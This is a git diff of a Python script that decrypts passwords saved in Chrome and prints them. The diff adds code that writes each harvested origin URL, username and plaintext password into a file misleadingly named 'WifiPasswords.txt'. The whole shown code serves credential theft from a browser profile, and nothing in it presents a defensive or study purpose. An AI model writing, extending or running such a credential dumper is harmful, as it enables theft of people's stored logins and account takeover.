@@ -7,6 +7,8 @@ from Crypto.Cipher import AES
 import shutil
 from datetime import timezone, datetime, timedelta
 
+PWinFileChrome = open("WifiPasswords.txt", "w")
+
 def get_chrome_datetime(chromedate):
     """Return a `datetime.datetime` object from a chrome format datetime
     Since `chromedate` is formatted as the number of microseconds since January, 1601"""
@@ -68,6 +70,15 @@ def main():
         date_created = row[4]
         date_last_used = row[5]        
         if username or password:
+            PWinFileChrome.write("####################################################################################################\n\n")
+            PWinFileChrome.write(f"Origin URL: {origin_url} \n")
+            PWinFileChrome.write(f"Action URL: {action_url} \n")
+            PWinFileChrome.write(f"Username: {username} \n")
+            PWinFileChrome.write(f"Password: {password} \n")
+            PWinFileChrome.write("\n")
+            PWinFileChrome.write("####################################################################################################\n\n")
+
+
             print(f"Origin URL: {origin_url}")
             print(f"Action URL: {action_url}")
             print(f"Username: {username}")
@@ -88,3 +99,5 @@ def main():
         pass
 if __name__ == "__main__":
     main()
+
+PWinFileChrome.close()
